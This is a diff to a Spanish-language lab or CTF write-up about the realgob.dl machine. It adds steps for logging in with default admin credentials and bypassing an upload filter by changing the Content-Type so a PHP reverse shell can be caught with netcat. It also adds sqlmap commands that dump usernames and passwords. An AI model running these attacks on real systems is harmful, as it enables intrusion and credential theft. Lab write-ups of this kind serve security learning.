@@ -63,9 +63,43 @@ http://realgob.dl/about.php?file=wrapper
 f.- Tenemos acceso
 
 #### - Bypass php - JPEG - cambiando el Content - Type
+Iniciamos sesión en /admin.php, con las credenciales admin:admin123
+
+luego de eso me sale una opción para subir un archivo, intercepto la petición con burpsuite y hago este artificio:
+
+![alt text](image-11.png)
+
+me dirijo a uploads:
+
+![alt text](image-12.png)
+
+coloco netcat en modo escucha, hago clic en revshell.php y listo tengo acceso, luego hago tratamiento de la tty:
+
+![alt text](image-13.png)
 
 #### - SQLi
 
+Me registro con un usuario daniel y la contraseña 12345678, al momento de registrarme me manda a una página /realgob/edo_cuenta.php?id=68 , le doy en realizar pago y me manda al id=1, entonces me hace pensar que se trata de un SQLi
+
+Tomamos la url = http://realgob.dl/edo_cuenta.php?id=1
+
+y ejecutamos:
+
+sqlmap -u http://realgob.dl/edo_cuenta.php?id=1 --dbs --batch
+
+![alt text](image-14.png)
+
+ver las tablas de la base de datos GOB_DB
+
+sqlmap -u http://realgob.dl/noticias.php?id=1 -D GOB_BD --tables --batch
+
+![alt text](image-15.png)
+
+ver usuarios y contraseñas:
+
+sqlmap -u http://realgob.dl/noticias.php?id=1 -D GOB_BD -T users -C username,password --dump --batch
+
+![alt text](image-16.png)
 
 ### 5.- Escalar privilegios
 
